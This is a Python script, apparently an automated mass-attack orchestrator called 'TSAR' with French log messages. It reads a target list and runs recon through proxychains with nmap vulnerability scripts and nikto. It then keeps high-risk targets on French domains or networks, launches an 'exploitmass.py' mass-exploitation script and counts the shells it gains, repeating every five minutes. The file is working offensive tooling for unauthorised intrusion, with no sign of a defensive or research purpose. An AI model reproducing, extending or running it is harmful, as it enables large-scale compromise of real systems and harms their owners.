#!/usr/bin/env python3
import os, json, subprocess, time, logging
from pathlib import Path
from concurrent.futures import ProcessPoolExecutor
from tenacity import retry, stop_after_attempt, wait_exponential

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger('TSAR')

class Tsar:
    def __init__(self):
        self.chain = Path('/chain')
        self.docked = self.chain / 'docked_targets.json'
        self.high_risk = self.chain / 'docked/high_risk.json'
        self.vlun_sh = self.chain / 'VLUN_Sh/VLUN_Sh.txt'
        self.threshold = int(os.getenv('DOCK_THRESHOLD', 70))

    @retry(stop=stop_after_attempt(3), wait=wait_exponential(multiplier=1, min=4, max=60))
    def run(self, cmd, timeout=120):
        return subprocess.run(['proxychains4', '-q'] + cmd, capture_output=True, text=True, timeout=timeout, check=True)

    def recon(self, target):
        methods = [
            lambda: self.run(['/tsar-venv/bin/python3', '/tsar-exec/recon.py', target]),
            lambda: self.run(['nmap', '-sV', '--script=vuln', target]),
            lambda: self.run(['nikto', '-h', target])
        ]
        for method in methods:
            try:
                result = method()
                logger.info(f"Recon OK pour {target}")
                return result.stdout
            except Exception as e:
                logger.warning(f"Méthode recon échouée: {e}")
        logger.error(f"Toutes méthodes recon échouées pour {target}")
        return None

    def dock(self):
        if not self.docked.exists():
            return
        with open(self.docked) as f:
            data = json.load(f)
        high = [t for t in data if t.get('risk_score', 0) >= self.threshold and ('.fr' in t.get('target', '') or 'FR' in str(t.get('network', '')))]
        self.high_risk.parent.mkdir(exist_ok=True)
        with open(self.high_risk, 'w') as f:
            json.dump(high, f)
        logger.info(f"Docked high-risk: {len(high)}")

    def exploit(self):
        if not self.high_risk.exists():
            return
        try:
            result = self.run(['/tsar-venv/bin/python3', '/tsar-exec/exploitmass.py'], timeout=600)
            logger.info(f"Exploitmass OK")
            shells = len(self.vlun_sh.read_text().splitlines()) if self.vlun_sh.exists() else 0
            logger.info(f"Shells: {shells}")
        except Exception as e:
            logger.error(f"Exploit échoué: {e}")

    def cycle(self):
        targets = [l.strip() for l in (self.chain / 'input/targets.txt').read_text().splitlines() if l.strip() and not l.startswith('#')]
        with ProcessPoolExecutor(max_workers=3) as ex:
            ex.map(self.recon, targets)
        self.dock()
        self.exploit()

    def run_loop(self):
        while True:
            try:
                self.cycle()
                time.sleep(int(os.getenv('CYCLE_TIME', 300)))
            except Exception as e:
                logger.error(f"Cycle error: {e}")
                time.sleep(60)

if __name__ == '__main__':
    Tsar().run_loop()
    
